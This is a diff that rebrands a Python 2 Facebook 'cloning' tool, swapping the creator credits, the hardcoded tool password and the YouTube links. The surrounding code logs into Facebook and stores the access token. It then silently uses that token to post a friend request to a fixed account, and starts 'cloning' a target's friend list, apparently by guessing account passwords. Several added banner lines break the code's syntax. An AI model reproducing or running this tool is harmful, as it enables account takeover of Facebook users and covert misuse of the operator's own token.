@@ -53,12 +53,18 @@ logo = """
 \033[1;95m \/_/\ \/ \ \ \  \ \ \__ \  \ \  __\   \ \  __<   
 \033[1;94m    \ \_\  \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
 \033[1;93m     \/_/   \/_/   \/_____/   \/_____/   \/_/ /_/ 
+jalan("\033[1;96m▬▬▬▬▬ager tum commnad copy karhe ho")
+jalan("\033[1;96m▬▬▬▬▬ TU US SA TUM Harshu NI BNJAO GY ")
 \033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
-\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝕸𝖗.𝕽𝖆𝖓𝖆 𝕬𝖆𝖍𝖎𝖑               ║    
-\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ Aahil Creations            ║  
+\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝕸𝖗.𝕳𝖆𝖗𝖘𝖍𝖚 𝖉𝖚𝖇𝖊𝖞
+
+              ║ 
+\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 fb trick hour
 \033[1;96m    ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊  ║
-\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
+\033[1;91m   
+              ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
 def tik():
+	
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)
@@ -85,19 +91,23 @@ print  """
 \033[1;95m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
 \033[1;95m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
 """
-jalan("\033[1;92m              _    _     _ ")             
-jalan("\033[1;92m             | |  (_)   | |")             
-jalan("\033[1;92m  _ __   __ _| | ___ ___| |_ __ _ _ __  ZINDABAD✔ ") 
-jalan("\033[1;97m | '_ \ / _` | |/ / / __| __/ _` | '_ \ ")
-jalan("\033[1;97m | |_) | (_| |   <| \__ \ || (_| | | | |")
-jalan("\033[1;92m | .__/ \__,_|_|\_\_|___/\__\__,_|_| |_|")
-jalan("\033[1;92m | | ")                                   
-jalan("\033[1;92m |_| ")
+
+jalan("\033[1;96m▀█▀ ▒█▄░▒█ ▒█▀▀▄ ▀█▀ ░█▀▀█ ▒█▄░▒█ harshu dubey")
+
+▒jalan("\033[1;96m█░ ▒█▒█▒█ ▒█░▒█ ▒█░ ▒█▄▄█ ▒█▒█▒█ 
+
+jalan("\033[1;96m▄█▄ ▒█░░▀█ ▒█▄▄▀ ▄█▄ ▒█░▒█ ▒█░░▀█
 
 
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+
+                              
+
+
+
+
+CorrectUsername = "harshu"
+CorrectPassword = "ruchika"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -109,10 +119,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.youtube.com/channel/UC3S835IJhJvZiTL04O0AHBg')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.youtube.com/channel/UC3S835IJhJvZiTL04O0AHBg')
 
 def login():
 	os.system('clear')
@@ -153,7 +163,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UC3S835IJhJvZiTL04O0AHBg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -267,7 +277,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;92m•◈•══════••◈•\033[1;91mBlackTiger\033[1;95m•◈•══════••◈•"
+		print "\033[1;92m•◈•══════••◈•\033[1;91mharshudubey\033[1;95m•◈•══════••◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -295,7 +305,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
 
-	jalan('           \033[1;91mAahil start cloning Wait...')
+	jalan('           \033[1;91mharshustart cloning Wait...')
 	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
@@ -538,7 +548,7 @@ _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....Aahil Creations....... \033[1;95m :
+: \033[1;91m ....harshu Creations....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
               \033[1;91m Aahil"""
